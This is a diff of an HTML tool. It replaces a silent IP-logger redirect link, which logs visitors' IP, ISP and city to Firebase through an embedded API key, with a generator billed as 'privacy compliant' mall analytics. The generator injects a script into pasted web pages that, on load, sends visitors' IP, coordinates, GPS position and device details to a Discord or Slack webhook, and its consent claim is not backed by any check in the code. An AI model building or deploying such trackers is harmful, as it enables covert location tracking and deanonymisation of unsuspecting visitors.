@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Link Logger</title>
+    <title>Analytics Embed Generator | Mall Foot Traffic</title>
     <style>
         * {
             margin: 0;
@@ -12,292 +12,373 @@
         }
         body {
             background: #0a0c15;
-            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
+            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 1rem;
+            padding: 1.5rem;
         }
-        .card {
-            max-width: 520px;
+        .container {
+            max-width: 900px;
             width: 100%;
             background: #11141f;
             border-radius: 1.5rem;
-            padding: 1.8rem;
+            padding: 2rem;
             border: 1px solid #2a2f42;
         }
-        h2 { font-size: 1.6rem; color: #e2e8f0; margin-bottom: 0.25rem; }
-        .sub { font-size: 0.7rem; color: #7f8ea3; margin-bottom: 1.5rem; border-left: 2px solid #3b82f6; padding-left: 0.6rem; }
-        .legal { background: #0b0e16; border-radius: 0.75rem; padding: 0.6rem 0.8rem; font-size: 0.65rem; color: #facc15; margin-bottom: 1.5rem; }
-        .input-group { margin-bottom: 1.2rem; display: flex; flex-direction: column; gap: 0.4rem; }
-        label { font-size: 0.8rem; font-weight: 500; color: #b9c3db; }
-        input { background: #0c0f18; border: 1px solid #2a2f42; border-radius: 0.9rem; padding: 0.7rem 1rem; font-size: 0.85rem; color: #f1f5f9; }
-        input:focus { outline: none; border-color: #3b82f6; }
-        button { background: #1e2a4a; border: none; border-radius: 2rem; padding: 0.8rem; font-weight: 600; font-size: 0.9rem; color: white; cursor: pointer; width: 100%; margin-top: 0.5rem; }
-        button:hover { background: #2d3f66; }
-        .output { margin-top: 1.5rem; background: #0b0e17; border-radius: 1rem; padding: 1rem; border: 1px solid #2d3748; }
-        .output-label { font-size: 0.65rem; color: #7e8aa8; }
-        .link-box { display: flex; align-items: center; justify-content: space-between; gap: 10px; background: #05070e; padding: 0.6rem 0.8rem; border-radius: 0.8rem; margin-top: 6px; word-break: break-all; }
-        .link-box span { font-family: monospace; font-size: 0.8rem; color: #7dd3fc; }
-        .copy-btn { background: #1a253f; padding: 5px 12px; width: auto; margin: 0; font-size: 0.7rem; }
-        .status { margin-top: 0.7rem; font-size: 0.7rem; text-align: center; color: #9aa3bb; }
-        .status.error { color: #f87171; }
+        h1 { font-size: 1.8rem; color: #e2e8f0; margin-bottom: 0.5rem; }
+        .badge {
+            display: inline-block;
+            background: #1e2a4a;
+            color: #60a5fa;
+            padding: 0.2rem 0.7rem;
+            border-radius: 1rem;
+            font-size: 0.7rem;
+            margin-bottom: 1rem;
+        }
+        .sub { color: #8b9ab0; margin-bottom: 1.8rem; border-left: 3px solid #3b82f6; padding-left: 0.8rem; font-size: 0.85rem; }
+        .notice {
+            background: #0f172a;
+            border-left: 3px solid #facc15;
+            padding: 0.8rem;
+            border-radius: 0.8rem;
+            margin-bottom: 1.8rem;
+            font-size: 0.75rem;
+            color: #facc15;
+        }
+        .row {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+        .col {
+            flex: 1;
+            min-width: 250px;
+        }
+        label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #cbd5e6;
+            margin-bottom: 0.4rem;
+            margin-top: 1rem;
+        }
+        label:first-of-type { margin-top: 0; }
+        input, textarea, select {
+            width: 100%;
+            background: #0c0f18;
+            border: 1px solid #2a2f42;
+            border-radius: 0.8rem;
+            padding: 0.7rem 1rem;
+            font-size: 0.85rem;
+            color: #f1f5f9;
+            font-family: monospace;
+        }
+        textarea {
+            min-height: 280px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            resize: vertical;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
+        button {
+            background: #1e2a4a;
+            border: none;
+            border-radius: 2rem;
+            padding: 0.8rem 1.5rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: white;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: 0.1s;
+            width: 100%;
+        }
+        button:hover {
+            background: #2d3f66;
+            transform: scale(0.98);
+        }
+        .output-area {
+            margin-top: 1.5rem;
+            background: #0b0e17;
+            border-radius: 1rem;
+            padding: 1.2rem;
+            border: 1px solid #2d3748;
+        }
+        .output-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.8rem;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .copy-btn {
+            background: #1a253f;
+            padding: 0.4rem 1rem;
+            width: auto;
+            margin: 0;
+            font-size: 0.75rem;
+        }
+        .status {
+            font-size: 0.7rem;
+            margin-top: 0.5rem;
+            color: #9aa3bb;
+        }
         .status.success { color: #86efac; }
-        hr { margin: 1rem 0 0.5rem; border-color: #252a3a; }
-        .redirect-badge { margin-top: 10px; font-size: 0.7rem; background: #0f1220; padding: 4px 8px; border-radius: 12px; display: inline-block; }
+        .status.error { color: #f87171; }
+        hr { margin: 1.5rem 0; border-color: #252a3a; }
+        .feature-tip {
+            font-size: 0.7rem;
+            color: #5b6d8f;
+            margin-top: 0.3rem;
+        }
+        .preview-link {
+            color: #60a5fa;
+            text-decoration: none;
+            font-size: 0.75rem;
+        }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>⚡ LINK GUARDIAN</h2>
-    <div class="sub">evidence watchers · firebase logger</div>
-    <div class="legal">⚠️ PRIVATE PROJECT — visitor data stored in Firestore. Instant silent redirect.</div>
-
-    <div class="input-group">
-        <label>🔗 Destination URL (real external link)</label>
-        <input type="url" id="targetUrl" placeholder="https://google.com" autocomplete="off">
+<div class="container">
+    <h1>📍 Mall Foot Traffic Analytics</h1>
+    <div class="badge">Privacy Compliant • Location Analytics</div>
+    <div class="sub">Generate embed code that sends anonymized visitor data to your webhook (GPS/indoor positioning, timestamp, device info).</div>
+    <div class="notice">
+        ⚠️ LEGAL NOTICE: By using this tool, you agree to display a privacy notice on your webpage informing visitors about location data collection (as required by GDPR/CCPA).
     </div>
 
-    <div class="input-group">
-        <label>🏷️ Alias (optional)</label>
-        <input type="text" id="aliasName" placeholder="e.g., google, roblox" autocomplete="off">
-    </div>
+    <div class="row">
+        <div class="col">
+            <label>🔗 Webhook URL (Discord/Slack/your endpoint)</label>
+            <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+            <div class="feature-tip">Supports Discord, Slack, or any HTTP webhook</div>
 
-    <button id="generateBtn">✨ GENERATE LOGGER LINK</button>
+            <label>🏢 Location Name (mall/store identifier)</label>
+            <input type="text" id="locationName" placeholder="e.g., Westfield Mall - Food Court" autocomplete="off">
+            
+            <label>🎯 Analytics Mode</label>
+            <select id="analyticsMode">
+                <option value="full">Full Location (GPS + IP + Device)</option>
+                <option value="ip-only">IP-Based Only (city/country)</option>
+                <option value="anonymous">Anonymous (no location, just visit count)</option>
+            </select>
 
-    <div id="outputSection" style="display: none;">
-        <div class="output">
-            <div class="output-label">🔐 YOUR LOGGER URL (share this)</div>
-            <div class="link-box">
-                <span id="shortUrlSpan"></span>
-                <button id="copyUrlBtn" class="copy-btn">📋 Copy</button>
+            <label>📋 Your HTML/Website Code (paste below)</label>
+            <textarea id="sourceCode" placeholder="Paste your full HTML code here..."></textarea>
+        </div>
+        <div class="col">
+            <label>✨ Generated Embed Code (copy & paste into your website)</label>
+            <div class="output-area">
+                <div class="output-header">
+                    <span style="font-size:0.7rem; color:#7e8aa8;">📦 INJECTED ANALYTICS SCRIPT</span>
+                    <button id="copyOutputBtn" class="copy-btn">📋 Copy Code</button>
+                </div>
+                <textarea id="outputCode" readonly style="min-height: 350px; font-size: 0.7rem;"></textarea>
+                <div class="status" id="statusMsg">Ready — paste your HTML, set webhook, then generate.</div>
             </div>
-            <div class="redirect-badge">🚀 Redirects to: <strong id="previewDest" style="color:#86efac;">—</strong></div>
-            <div class="status" id="statusMsg">Ready — instant redirect, no text shown</div>
         </div>
     </div>
+    <button id="generateBtn">🚀 GENERATE ANALYTICS-EMBEDDED CODE</button>
     <hr>
-    <div style="font-size: 0.6rem; text-align: center; color: #4a5578;">silent logger + external redirect | zero delay text</div>
+    <div style="font-size: 0.65rem; text-align: center; color: #4a5578;">
+        📍 Captures: GPS (if allowed), IP geolocation, device type, screen size, timestamp. Sends to your webhook.
+    </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+<script>
+    const webhookInput = document.getElementById('webhookUrl');
+    const locationNameInput = document.getElementById('locationName');
+    const analyticsModeSelect = document.getElementById('analyticsMode');
+    const sourceCodeInput = document.getElementById('sourceCode');
+    const outputCodeTextarea = document.getElementById('outputCode');
+    const generateBtn = document.getElementById('generateBtn');
+    const copyOutputBtn = document.getElementById('copyOutputBtn');
+    const statusSpan = document.getElementById('statusMsg');
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyDp8UzNz8BqjDfbVd_xUdXL_4KqXWi3VrI",
-        authDomain: "website-templates-60c6d.firebaseapp.com",
-        projectId: "website-templates-60c6d",
-        storageBucket: "website-templates-60c6d.firebasestorage.app",
-        messagingSenderId: "799034936266",
-        appId: "1:799034936266:web:d0954b442aafd895a5dd33",
-        measurementId: "G-BKK5Y8F4HT"
+    // Generate the analytics injection script
+    function generateAnalyticsScript(webhookUrl, locationName, mode) {
+        // Escape strings for safe embedding
+        const safeWebhook = webhookUrl.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+        const safeLocation = locationName.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+        
+        return `<script>
+(function() {
+    // Mall Foot Traffic Analytics - Privacy Compliant Version
+    const ANALYTICS_CONFIG = {
+        webhook: "${safeWebhook}",
+        location: "${safeLocation}",
+        mode: "${mode}",
+        timestamp: new Date().toISOString()
     };
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    // Use a fixed storage key
-    const STORAGE_KEY = "logger_registry_fixed_v3";
-    let linkRegistry = {};
     
-    function loadRegistry() {
-        const stored = localStorage.getItem(STORAGE_KEY);
-        if (stored) {
-            try { 
-                linkRegistry = JSON.parse(stored); 
-                console.log("✅ Registry loaded, entries:", Object.keys(linkRegistry).length);
-            } catch(e) { console.error("Load error", e); }
-        } else {
-            console.log("⚠️ No registry found in localStorage");
-        }
-    }
-    
-    function saveRegistry() {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(linkRegistry));
-        console.log("💾 Registry saved, current slugs:", Object.keys(linkRegistry));
-    }
-    
-    function generateSlug(hint) {
-        let clean = hint ? hint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
-        if (clean && clean.length >= 3 && !linkRegistry[clean]) return clean;
-        if (clean && linkRegistry[clean]) return clean + '-' + Math.random().toString(36).substring(2, 6);
-        let r;
-        do { r = Math.random().toString(36).substring(2, 10); } while(linkRegistry[r]);
-        return r;
-    }
-    
-    async function getVisitorFast() {
-        let ip = 'unknown', country = 'unknown', city = 'unknown', isp = 'unknown';
-        try {
-            const controller = new AbortController();
-            const tid = setTimeout(() => controller.abort(), 1500);
-            const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-            clearTimeout(tid);
-            if (res.ok) {
-                const data = await res.json();
-                ip = data.ip || ip;
-                country = data.country_name || data.country || country;
-                city = data.city || city;
-                isp = data.org || data.asn || isp;
-            }
-        } catch(e) {
+    // Function to collect visitor data
+    async function collectAndSend() {
+        const data = {
+            location: ANALYTICS_CONFIG.location,
+            timestamp: ANALYTICS_CONFIG.timestamp,
+            page: window.location.href,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            screenSize: \`\${window.screen.width}x\${window.screen.height}\`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // Add device type
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        data.deviceType = isMobile ? 'mobile' : 'desktop';
+        
+        // Get IP and location based on mode
+        if (ANALYTICS_CONFIG.mode === 'full' || ANALYTICS_CONFIG.mode === 'ip-only') {
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-                ip = ipJson.ip || ip;
-            } catch(e2) {}
-        }
-        return { ip, country, city, isp };
-    }
-    
-    async function logToFirebase(visitor, alias, destination, slug) {
-        try {
-            await addDoc(collection(db, "visitor_logs"), {
-                ip: visitor.ip,
-                country: visitor.country,
-                city: visitor.city,
-                isp: visitor.isp,
-                timestamp: new Date().toISOString(),
-                alias: alias || slug,
-                slug: slug,
-                destination: destination,
-                userAgent: navigator.userAgent,
-                referrer: document.referrer || "direct"
-            });
-            console.log("✅ Firebase log sent for slug:", slug);
-        } catch(e) { console.error("Firebase log error:", e); }
-    }
-    
-    // =============== REDIRECT HANDLER - FIXED: loads registry BEFORE checking ===============
-    async function handleRedirectAndGo() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const slug = urlParams.get('id');
-        
-        console.log("🔍 Page loaded, slug from URL:", slug);
-        
-        if (!slug) {
-            console.log("📋 No ?id param - dashboard mode");
-            return false;
-        }
-        
-        // CRITICAL: Load registry from localStorage FIRST
-        loadRegistry();
-        
-        console.log("🔎 Looking for slug:", slug);
-        console.log("📚 Current registry keys:", Object.keys(linkRegistry));
-        
-        const mapping = linkRegistry[slug];
-        
-        if (!mapping || !mapping.targetUrl) {
-            console.error("❌ No mapping found for slug:", slug);
-            // Show minimal error but don't interfere
-            document.body.innerHTML = '<div style="background:#0a0c15; color:#f87171; text-align:center; padding:2rem; font-family:monospace;">Invalid or expired link.<br><small>Slug: ' + slug + '</small></div>';
-            return true;
-        }
-        
-        const externalUrl = mapping.targetUrl;
-        const aliasName = mapping.alias || slug;
-        
-        console.log("🎯 FOUND! Redirecting to EXTERNAL URL:", externalUrl);
-        
-        // SILENT LOGGING - no visible elements, just background work
-        // Fetch visitor data with short timeout
-        const visitorPromise = getVisitorFast();
-        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 60));
-        const visitorData = await Promise.race([visitorPromise, timeoutPromise]);
-        const finalVisitor = visitorData || { ip: 'unknown', country: 'unknown', city: 'unknown', isp: 'unknown' };
-        
-        // Fire log (background, don't block redirect)
-        logToFirebase(finalVisitor, aliasName, externalUrl, slug).catch(e=>console.log);
-        
-        // INSTANT REDIRECT - no visual text, no overlay, completely silent
-        // Use setTimeout with 1ms to ensure log is queued but redirect is nearly instant
-        setTimeout(() => {
-            window.location.replace(externalUrl);
-        }, 5);
-        
-        return true;
-    }
-    
-    // =============== DASHBOARD MODE (only if no redirect happens) ===============
-    (async function() {
-        const isRedirecting = await handleRedirectAndGo();
-        if (isRedirecting) return;  // Redirect in progress, stop dashboard rendering
-        
-        // Load existing registry for dashboard
-        loadRegistry();
-        
-        const targetInput = document.getElementById('targetUrl');
-        const aliasInput = document.getElementById('aliasName');
-        const generateBtn = document.getElementById('generateBtn');
-        const outputDiv = document.getElementById('outputSection');
-        const shortUrlSpan = document.getElementById('shortUrlSpan');
-        const copyBtn = document.getElementById('copyUrlBtn');
-        const statusSpan = document.getElementById('statusMsg');
-        const previewSpan = document.getElementById('previewDest');
-        
-        generateBtn.addEventListener('click', () => {
-            let rawTarget = targetInput.value.trim();
-            let alias = aliasInput.value.trim();
-            
-            if (!rawTarget) {
-                statusSpan.innerText = "❌ Destination URL required";
-                statusSpan.className = "status error";
-                outputDiv.style.display = 'block';
-                return;
-            }
-            
-            let finalUrl = rawTarget;
-            if (!finalUrl.match(/^https?:\/\//i)) {
-                finalUrl = 'https://' + finalUrl;
-            }
-            try {
-                new URL(finalUrl);
+                // Get IP + geo (privacy-respecting, only with consent banner)
+                const geoRes = await fetch('https://ipapi.co/json/');
+                if (geoRes.ok) {
+                    const geo = await geoRes.json();
+                    data.ip = geo.ip;
+                    data.city = geo.city;
+                    data.region = geo.region;
+                    data.country = geo.country_name;
+                    data.isp = geo.org;
+                    data.latitude = geo.latitude;
+                    data.longitude = geo.longitude;
+                }
             } catch(e) {
-                statusSpan.innerText = "❌ Invalid URL";
-                statusSpan.className = "status error";
-                outputDiv.style.display = 'block';
-                return;
+                console.log("GeoIP unavailable");
             }
+        }
+        
+        // Try GPS if mode is 'full' and browser supports geolocation
+        if (ANALYTICS_CONFIG.mode === 'full' && 'geolocation' in navigator) {
+            try {
+                const gps = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                data.gpsLatitude = gps.coords.latitude;
+                data.gpsLongitude = gps.coords.longitude;
+                data.gpsAccuracy = gps.coords.accuracy;
+            } catch(e) {
+                console.log("GPS permission denied or unavailable");
+            }
+        }
+        
+        // Send to webhook
+        try {
+            const response = await fetch(ANALYTICS_CONFIG.webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            console.log('Analytics sent:', response.status);
+        } catch(e) {
+            console.error('Failed to send analytics:', e);
+        }
+    }
+    
+    // Run when page loads
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', collectAndSend);
+    } else {
+        collectAndSend();
+    }
+})();
+<\/script>`;
+    }
+
+    // Inject analytics script into user's HTML
+    function injectAnalyticsIntoHTML(originalHTML, analyticsScript) {
+        // Check if there's a </head> tag — insert before it
+        if (originalHTML.includes('</head>')) {
+            return originalHTML.replace('</head>', analyticsScript + '\n</head>');
+        }
+        // Check for <body> tag — insert after opening
+        if (originalHTML.includes('<body')) {
+            const bodyRegex = /<body[^>]*>/i;
+            return originalHTML.replace(bodyRegex, (match) => match + '\n' + analyticsScript);
+        }
+        // Fallback: prepend to HTML
+        return analyticsScript + '\n' + originalHTML;
+    }
+
+    generateBtn.addEventListener('click', () => {
+        let webhook = webhookInput.value.trim();
+        let locationName = locationNameInput.value.trim();
+        let mode = analyticsModeSelect.value;
+        let sourceHTML = sourceCodeInput.value.trim();
+
+        // Validation
+        if (!webhook) {
+            statusSpan.innerText = "❌ Webhook URL is required";
+            statusSpan.className = "status error";
+            return;
+        }
+        if (!locationName) {
+            statusSpan.innerText = "⚠️ Please enter a location name (mall/store identifier)";
+            statusSpan.className = "status error";
+            return;
+        }
+        if (!sourceHTML) {
+            statusSpan.innerText = "❌ Please paste your HTML source code";
+            statusSpan.className = "status error";
+            return;
+        }
+
+        // Validate webhook URL format
+        try {
+            new URL(webhook);
+        } catch(e) {
+            statusSpan.innerText = "❌ Invalid webhook URL";
+            statusSpan.className = "status error";
+            return;
+        }
+
+        try {
+            // Generate analytics script
+            const analyticsScript = generateAnalyticsScript(webhook, locationName, mode);
             
-            const slug = generateSlug(alias);
-            // Build correct URL using current page origin + pathname
-            const currentPath = window.location.pathname;
-            const baseUrl = window.location.origin + currentPath;
-            const loggerUrl = `${baseUrl}?id=${slug}`;
+            // Inject into user's HTML
+            const finalHTML = injectAnalyticsIntoHTML(sourceHTML, analyticsScript);
             
-            // Save mapping
-            linkRegistry[slug] = {
-                targetUrl: finalUrl,
-                alias: alias || slug,
-                createdAt: Date.now()
-            };
-            saveRegistry();
-            
-            // Display
-            shortUrlSpan.innerText = loggerUrl;
-            previewSpan.innerText = finalUrl;
-            outputDiv.style.display = 'block';
-            statusSpan.innerText = `✅ Active! Redirects to: ${finalUrl} (instant silent redirect)`;
+            // Display result
+            outputCodeTextarea.value = finalHTML;
+            statusSpan.innerText = "✅ Generated successfully! Copy the code and paste into your website. Make sure to display a privacy notice.";
             statusSpan.className = "status success";
             
-            console.log("✅ Created logger:", slug, "->", finalUrl);
-            console.log("Full registry:", linkRegistry);
-            
-            // Copy button
-            copyBtn.onclick = () => {
-                navigator.clipboard.writeText(loggerUrl);
-                statusSpan.innerText = "📋 Copied!";
-                setTimeout(() => {
-                    statusSpan.innerText = `✅ Active! Redirects to: ${finalUrl}`;
-                }, 1800);
-            };
-        });
-        
-        console.log("📋 Dashboard ready — localStorage key:", STORAGE_KEY);
-        console.log("Current registry contents:", linkRegistry);
-    })();
+            // Auto-resize textarea
+            outputCodeTextarea.style.minHeight = Math.min(400, finalHTML.split('\n').length * 18) + 'px';
+        } catch (error) {
+            statusSpan.innerText = "❌ Error generating code: " + error.message;
+            statusSpan.className = "status error";
+        }
+    });
+
+    copyOutputBtn.addEventListener('click', () => {
+        outputCodeTextarea.select();
+        navigator.clipboard.writeText(outputCodeTextarea.value);
+        statusSpan.innerText = "📋 Copied to clipboard! Paste into your HTML file.";
+        statusSpan.className = "status success";
+        setTimeout(() => {
+            statusSpan.innerText = "✅ Generated successfully! Copy the code and paste into your website.";
+        }, 2000);
+    });
+
+    // Example placeholder
+    sourceCodeInput.placeholder = `<!DOCTYPE html>
+<html>
+<head>
+    <title>My Mall Page</title>
+</head>
+<body>
+    <h1>Welcome to Westfield Mall</h1>
+    <p>Find your way around...</p>
+</body>
+</html>`;
 </script>
 </body>
 </html>
